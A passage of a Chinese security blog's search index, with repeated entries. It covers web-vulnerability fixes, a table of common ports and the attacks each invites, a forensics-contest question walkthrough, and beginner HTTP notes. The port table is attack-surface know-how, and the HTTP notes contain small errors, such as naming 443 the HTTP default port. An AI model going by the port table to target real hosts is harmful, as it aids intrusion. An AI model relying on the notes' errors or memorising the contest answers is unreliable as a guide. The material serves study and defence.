由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。 Fix 页面进行严格的访问权限的控制以及对访问角色进行权限检查 可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:12:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#12未授权访问"},{"categories":["web"],"content":"\r12.未授权访问\rDescription​ 由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。 Fix 页面进行严格的访问权限的控制以及对访问角色进行权限检查 可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:12:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-11"},{"categories":["web"],"content":"\r12.未授权访问\rDescription​ 由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。 Fix 页面进行严格的访问权限的控制以及对访问角色进行权限检查 可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:12:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-11"},{"categories":["web"],"content":"\r13.URL 跳转\rDescription​ 有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。 Fix 在进行页面跳转前校验传入的URL是否为可信域名 白名单规定跳转链接 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:13:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#13url-跳转"},{"categories":["web"],"content":"\r13.URL 跳转\rDescription​ 有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。 Fix 在进行页面跳转前校验传入的URL是否为可信域名 白名单规定跳转链接 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:13:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-12"},{"categories":["web"],"content":"\r13.URL 跳转\rDescription​ 有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。 Fix 在进行页面跳转前校验传入的URL是否为可信域名 白名单规定跳转链接 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:13:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-12"},{"categories":["web"],"content":"\r14.敏感信息泄露\rDescription​ 在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。 Fix 如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。 不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。 在服务器端对相关敏感信息进行模糊化处理。 对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。 【参考资料】： 腾讯云开发者社区-《【漏洞加固】常见Web漏洞修复建议》 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:14:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#14敏感信息泄露"},{"categories":["web"],"content":"\r14.敏感信息泄露\rDescription​ 在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。 Fix 如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。 不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。 在服务器端对相关敏感信息进行模糊化处理。 对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。 【参考资料】： 腾讯云开发者社区-《【漏洞加固】常见Web漏洞修复建议》 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:14:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-13"},{"categories":["web"],"content":"\r14.敏感信息泄露\rDescription​ 在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。 Fix 如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。 不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。 在服务器端对相关敏感信息进行模糊化处理。 对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。 【参考资料】： 腾讯云开发者社区-《【漏洞加固】常见Web漏洞修复建议》 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:14:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-13"},{"categories":["web","manual"],"content":"常见端口漏洞汇总 端口号 端口说明 相关漏洞 21 FTP文件传输协议 允许匿名的上传、下载、爆破和嗅探操作 22 SSH远程连接 爆破、SSH隧道及内网代理转发、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名服务器 允许区域传送、DNS劫持、缓存投毒、欺骗、CVE-2020-1350 67、68 DHCP服务 劫持、欺骗 69 小型文件传输协议 允许匿名的上传、下载、爆破和嗅探操作 80 常见web服务端口 web攻击、爆破、对应服务器版本漏洞 110 POP3协议 嗅探、爆破 139 SAMBA服务 爆破、未授权访问、远程代码执行 143 IMAP协议 爆破 161 SNMP协议 爆破、搜集目标内网信息 389 LDAP目录访问协议 注入、允许匿名访问、弱口令 443 常见web端口 web攻击、爆破、对应服务器版本漏洞 445 Microsoft-DS，为共享开放 代码执行、ms06-040、0796等 512/513/514 Linux rexec服务 爆破、远程登录 873 rsync服务 匿名访问、文件上传 1352 Lotus Domino邮件服务 弱口令、信息泄露、爆破 1433 MSSQL数据库 注入、提权、SA弱口令、爆破 1521 Oracle数据库 TNS爆破、注入、反弹shell 2049 NFS服务 配置不当 2181 ZooKeeper服务 未授权访问 3306 Mysql数据库 注入、提权、爆破 3389 RDP远程端口连接 shift后门、爆破、ms12-020、CVE-2019-0708 3690 SVN服务 SVN泄露、未授权访问 4848 GlassFish控制台 弱口令 5000 Sysbase/DB2数据库 爆破、注入 5432 PostgreSQL数据库 爆破、注入、弱口令 5632 PcAnywhere服务 抓取密码、代码执行 5900 VNC 弱口令爆破 5984 CouchDB 未授权访问 6379 Redis数据库 可尝试为授权访问、弱口令爆破 7001/7002 WebLogic控制台 反序列化、控制台弱口令 8009 Tomcat AJP协议 Tomcat AJP协议漏洞 8069 Zabbix服务 远程执行、SQL注入 8080、8089 JBoss/Resin/Jetty/Jenkins/tomcat 反序列化、控制台弱口令 8888 jupyter notebook 未授权访问 9090 WebSphere控制台 Java反序列化、弱口令 9200、9300 Elasticsearch服务 远程执行 10000 webmin控制面板 弱口令 11211 Memcached服务 未授权访问 27017/27018 MongoDB数据库 爆破、未授权访问 50000 SAP Management Console 远程执行 50050 CobaltStrike 弱口令 ","date":"2023-11-17","objectID":"/port_vulnerabilities/:0:0","series":null,"tags":["web","manual"],"title":"常见端口漏洞总结","uri":"/port_vulnerabilities/#"},{"categories":["Forensics","wp"],"content":"2022盘古石电子取证大赛的样题wp 每道题5分，共计200分 ","date":"2023-11-17","objectID":"/pgs_practice/:0:0","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#"},{"categories":["Forensics","wp"],"content":"\r一、请检查窝点中的手机检材，回答以下问题1、 该OPPO手机的IMEI是： A. 860370043989014,860370049389006 B. 860370049389014,860370049389006 C. 860370049389014,860370043989006 D. 860370049839014,860370049839006 2、 该涉案人所使用的的微信ID和关联的手机号是： A. wxid_rn6kc87f1mb354 16521330311 B. wxid_rn5mjxpw1mb922 17721103461 C. wxid_wi8nf67f1lmd54 15528880561 D. wxid_kshn457f1lm123 15847880501 3、 涉案团伙的最后线 下犯罪窝点地址是： A. 闵行区古美西路86弄44号 B. 田林路1036号科技绿洲三期16号楼101室 C. 上海市合川路科技绿洲3期5-3号楼 D. 闵行区合川路2555号 4、 犯罪团伙所用的诈骗应用apk的sha256值是 A. 71064939606EE601F2F5A888C75F3949CB82A8DF472D15D77EE2A3DF663FC8E9 B. DC0909D078AC1B692836BB0526E52633DDE49D1286631FA0EF9C744925DF545E C. F67F61057828F57EA663CEBEDD638EE9A4BAF36F69DA7E002CBA54C9F8EAAF85 D. 96B1258E64DA18C323DE8ECE0F89D88B0F0B99F459F209B514F7F500D72B7D1B 要从文件系统里面找，然后导出，通过hash计算软件可算出sha256的值 5、 该涉案人手机在3月7日除了上海还可能去过哪个城市？ A. 长春 B. 成都 C. 武汉 D. 北京 6、 该涉案人可能用的输入法是和版本号： A. 10.9.4 B. 8.32.22.2010171749 C. 10.94 D. 8.32.22.201071749 7、 该输入法没有哪项权限： A. 照相 B. 连接网络 C. 修改型号 D. 读取文件 其他三种权限都有 没有修改型号的权限 1.android.permission.WRITE_USER_DICTIONARY允许应用程序向用户词典中写入新词 2.android.permission.WRITE_SYNC_SETTINGS写入Google在线同步设置 3.android.permission.WRITE_SOCIAL_STREAM读取用户的社交信息流 4.android.permission.WRITE_SMS允许程序写短信 5.android.permission.WRITE_SETTINGS允许程序读取或写入系统设置 6.android.permission.WRITE_SECURE_SETTINGS允许应用程序读取或写入安全系统设置 7.android.permission.WRITE_PROFILE允许程序写入个人资料数据 8.com.android.browser.permission.WRITE_HISTORY_BOOKMARKS允许一个应用程序写(但不可读)用户的浏览历史和书签 9.android.permission.WRITE_GSERVICES允许程序修改Google服务地图 10.android.permission.WRITE_EXTERNAL_STORAGE允许程序写入外部存储,如SD卡上写文件 11.android.permission.WRITE_CONTACTS写入联系人,但不可读取 12.android.permission.WRITE_CALL_LOG允许程序写入（但是不能读）用户的联系人数据 13.android.permission.WRITE_CALENDAR允许程序写入日程，但不可读取 14.android.permission.WRITE_APN_SETTINGS允许程序写入网络GPRS接入点设置 15.android.permission.WAKE_LOCK允许程序在手机屏幕关闭后后台进程仍然运行 16.android.permission.VIBRATE允许程序振动 17.android.permission.USE_SIP允许程序使用SIP视频服务 18.android.permission.USE_CREDENTIALS允许程序请求验证从AccountManager 19.android.permission.UPDATE_DEVICE_STATS允许程序更新设备状态 20.com.android.launcher.permission.UNINSTALL_SHORTCUT删除快捷方式 21.android.permission.TRANSMIT_IR允许使用设备的红外发射器，如果可用 22.android.permission.SYSTEM_ALERT_WINDOW允许程序显示系统窗口 23.android.permission.SUBSCRIBED_FEEDS_WRITE允许程序写入或修改订阅内容的数据库 24.android.permission.SUBSCRIBED_FEEDS_READ允许程序访问订阅信息的数据库 22.android.permission.STATUS_BAR允许程序打开、关闭、禁用状态栏 23.android.permission.SIGNAL_PERSISTENT_PROCESSES允许程序发送一个永久的进程信号 24.android.permission.SET_WALLPAPER_HINTS允许程序设置壁纸建议 25.android.permission.SET_WALLPAPER允许程序设置桌面壁纸 26.android.permission.SET_TIME_ZONE允许程序设置系统时区 27.android.permission.SET_TIME允许程序设置系统时间 28.android.permission.SET_PROCESS_LIMIT允许程序设置最大的进程数量的限制 29.android.permission.SET_PREFERRED_APPLICATIONS允许程序设置应用的参数，已不再工作具体查看addPackageToPreferred(String) 介绍 30.android.permission.SET_POINTER_SPEED无法被第三方应用获得，系统权限 31.android.permission.SET_ORIENTATION允许程序设置屏幕方向为横屏或标准方式显示，不用于普通应用 32.android.permission.SET_DEBUG_APP允许程序设置调试程序，一般用于开发 33.android.permission.SET_ANIMATION_SCALE允许程序设置全局动画缩放 34.android.permission.SET_ALWAYS_FINISH允许程序设置程序在后台是否总是退出 36.com.android.alarm.permission.SET_ALARM允许程序设置闹铃提醒 37.android.permission.SET_ACTIVITY_WATCHER允许程序设置Activity观察器一般用于monkey测试 38.android.permission.SEND_SMS允许程序发送短信 39.android.permission.SEND_RESPOND_VIA_MESSAGE允许用户在来电的时候用你的应用进行即时的短信息回复。 40.android.permission.RESTART_PACKAGES允许程序结束任务通过restartPackage(String)方法，该方式将在外来放弃 41.android.permission.REORDER_TASKS允许程序重新排序系统Z轴运行中的任务 42.android.permission.RECORD_AUDIO允许程序录制声音通过手机或耳机的麦克 43.android.permission.RECEIVE_WAP_PUSH允许程序接收WAP PUSH信息 44.android.permission.RECEIVE_SMS允许程序接收短信 45.android.permission.RECEIVE_MMS允许程序接收彩信 46.android.permission.RECEIVE_BOOT_COMPLETED允许程序开机自动运行 47.android.permission.REBOOT允许程序重新启动设备 48.android.permission.READ_USER_DICTIONARY从一个提供器中获取数据，针对对应的提供器，应用程序需要“读访问权限” 49.android.permission.READ_SYNC_STATS允许程序读取同步状态，获得Google在线同步状态 50.android.permission.READ_SYNC_SETTINGS允许程序读取同步设置，读取Google在线同步设置 51.android.permission.READ_SOCIAL_STREAM读取用户的社交信息流 52.android.permission.READ_SMS允许程序读取短信内容 53.android.permissio","date":"2023-11-17","objectID":"/pgs_practice/:0:1","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#一请检查窝点中的手机检材回答以下问题"},{"categories":["Forensics","wp"],"content":"\r二、请检查窝点中的计算机检材，回答以下问题14、 涉案计算机的计算机全名是？ A. DESKTOP-VC69QPB B. DESKTOP-KDN38R5 C. DESKTOP-SLU384N D. DESKTOP-I92E87D 15、 涉案计算机有效账户最后一次登录时间是？ A. 2022-03-15 09:43:04 +08 B. 2022-03-15 09:43:04 +00 C. 2022-03-15 17:43:04 +08 D. 2022-03-15 17:48:04 +00 16、 涉案计算机登录次数最多的账户是什么？登录了多少次？ A. admin 16 B. admin 19 C. administrator 16 D. administrator 19 17、 涉案计算机是否连接过SanDisk优盘，该优盘的序列号是什么？ A. 4C530001180221100781 B. 4C530001180221109491 C. 5D7E0001180221100781 D. 5D7E 0001180221109491 18、 涉案计算机以太网的Ip地址是？ A. 192.168.1.100 B. 192.168.1.101 C. 172.168.1.100 D. 172.168.1.101 19、 涉案Windows计算机通过浏览器是否下载过哪个软件？ A. QQ B. Navicat C. Clash D. wireshark 20、 嫌疑人使用navicat远程连接数据的IP是？ A. 45.77.15.219 B. 45.77.16.229 C. 35.66.15.219 D. 35.66.16.229 21、 涉案计算机是否存在加密分区，采用了什么加密方式？ A. Bitlocker B. TrueCrypt C. VeraCrypt D. CnCrypt 22、 涉案计算机加密分区里面word文档文件最后访问时间是什么? A. 2022-03-14 19：14：45 +08 B. 2022-03-14 19：14：45 +00 C. 2022-03-14 19：10：53 +08 D. 2022-03-14 19：10：53 +00 通过恢复秘钥进行解密 23、 涉案计算机加密分区中的txt文件SHA256值为？ 计算hash值 A.da54693b5f04ea703e23065b53d01d89ca36e0444dee62ba01622e6d186e4712 B.fa7a3b601325cfe85a9d6fff6514804d06754795175c87c3af162eac7dcf693a C.972403b4b8fdfc211d5a14178be7e02e792cbe6a7bd6ff827ebb2c8909f4e2b8 D.b7254757595ce0228801bd53417895c2b6f28781d98bec8d854f4772c06aea29 24、 涉案计算机使用的远程连接工具ToDesk的版本是？ A. 4.2.6.03021556 B. 12.5.1.44969 C. 14.28.2935.2 D. 11.0.61030 25、 哪个设备的IP曾经通过向日葵连接到本地计算机？ A. 11.91.214.117 B. 116.246.0.90 C. 58.244.39.225 D. 10.91.215.14 26、 嫌疑人使用的VPN使用了哪种加密算法 A. DES-128-CFB B. AES-256-cfb C. MD5 D. SHA 27、 以下哪个地址不会被自动识别走代理通道？ A. carfax.com/index.html B. api.expekt.com C. huluim.com/login D. api.dns100.com 使用盘古的计算机仿真软件打开镜像，去查看VPN软件Shadowsocket的文件，里面的pac.txt里有代理规则 28、 以下哪个IP会被代理软件识别为国内IP段进行直连。 A. 1.16.0.1 B. 1.205.0.1 C. 35.2.0.1 D. 56.11.0.1 **使用仿真系统进入，检索shadowsockets的**chn_ip.txt文件检索这4个选项 因为是ip段所以我在检索1.204时发现B. 1.205.0.1在ip段1.204.0.0—-1.207.255.255里面 29、 查看涉案计算机系统日志，判断该涉案计算机最后一次刷新时区信息是什么时间？ A. 2022-3-17 9:59:14 B. 2022-3-16 10:02:13 C. 2022-3-15 12:54:44 D. 2022-3-17 10:06:38 在仿真镜像后win+R输入eventvwr.msc,查看系统（但是里面有你仿真时的时间信息，需甄别） ","date":"2023-11-17","objectID":"/pgs_practice/:0:2","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#二请检查窝点中的计算机检材回答以下问题"},{"categories":["Forensics","wp"],"content":"\r三、请检查窝点中的服务器检材，回答以下问题30、 Liunx服务器的系统内核版本 A. 3.10.0-1127.el7.x86 B. 3.10.0-1127.el7.x86_64 C. 3.11.0-1127.el7.x86_64 D. 3.11.0-1127.el7.x86 31、 该涉案服务器宝塔面板的访问限制域名是什么？ A. h1.jsgjzfx.cn B. gjjszfx.cn C. h5.jsgjzfx.cn D. h5. gjjszfx.cn 32、 涉诈网站目录中数据库连接配置文件的路径 A./www/backup/file_history/www/wwwroot/h1.jsgjzfx.cn/Application/config.php B./www/backup/file_history/www/wwwroot/h1.jsgjzfx.cn/Application/Home/View/Qts/User/config.php C./www/wwwroot/h1.jsgjzfx.cn/Application/Common/Conf/config.php D./www/wwwroot/config.php 接着查看/www/wwwroot/h1.jsgjzfx.cn/Application/Common/Conf/config.php 33、 登录涉案网站后台，显示有多少用户 A. 922 B. 921 C. 920 D. 919 34、 受害人“好大哥”在涉案网站2022-03-04 14:39:26 充值金额状态 A.重置失败 B.交易中 C.充值完成 D.已充值 登录网站后台检索充值记录，查询2022-03-04的充值记录可以发现目标 35、 涉案网站总成功提现金额 A. 33808154.28 B. 338081541.28 C. 338081653.97 D. 33808165.97 登录网站后台检索提现申请。检索时间段（尽量往后时间），发现成功提现总金额为 338081541.28 36、 涉案网站的数据库中管理员登录次数最多的ip是哪个 A.112.114.103.205 B.13.124.79.70 C.43.254.219.161 D.14.204.0.87 打开数据库里的wp_login_log发现登录ip最多的是14.204.0.87 37、 涉案网站数据库中平仓时间在2020年1月1日-2020年12月31日的实盘交易订单数量 A. 5159 B. 2567 C. 3536 D. 4684 进入网站数据库，使用sql语句进行检索 38、 涉案网站数据库中购买\"以太坊\"交易产品的用户绑定银行名称为\"中国工商银行\"的用户有多少 A. 4 B. 3 C. 5 D. 7 sql语句： SELECT COUNT(DISTINCT o.uid) from (SELECT * FROM wp_bankinfo WHERE bankname = '中国工商银行') as b,(SELECT uid FROM wp_order WHERE option_name = '以太坊') AS o WHERE b.uid = o.uid ","date":"2023-11-17","objectID":"/pgs_practice/:0:3","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#三请检查窝点中的服务器检材回答以下问题"},{"categories":["Forensics","wp"],"content":"\r四、请检查窝点中的路由器检材导出报告，回答以下问题39、 该窝点中使用路由器的WiFi密码是？ A. TPGuest_8D70 B. admin123 C. TPLink_TL D. 688561qi 40、 在该窝点中勘验时分配IP为192.168.1.102的设备mac地址是？ A. 84-a9-38-28-f5-95 B. 6c-4b-90-8c-87-8c C. 80-b6-55-26-f4-4e D. 00-25-90-83-af-f2 ","date":"2023-11-17","objectID":"/pgs_practice/:0:4","series":null,"tags":["Forensics","wp"],"title":"盘古石取证练习wp","uri":"/pgs_practice/#四请检查窝点中的路由器检材导出报告回答以下问题"},{"categories":["notes"],"content":"第一次CTF基础学习笔记 Hello，everyone！ I’m new in town! ","date":"2022-09-20","objectID":"/web_base-2022.9/:0:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#"},{"categories":["notes"],"content":"\rHTTP基础","date":"2022-09-20","objectID":"/web_base-2022.9/:1:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http基础"},{"categories":["notes"],"content":"\r◎HTTP协议解析HTT(HyperText Transfer Protoclo)即超文本传输协议，详细规定了浏览器和万维网服务器之间互相通信的规则，是万维网交换信息的基础。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http协议解析"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http请求"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 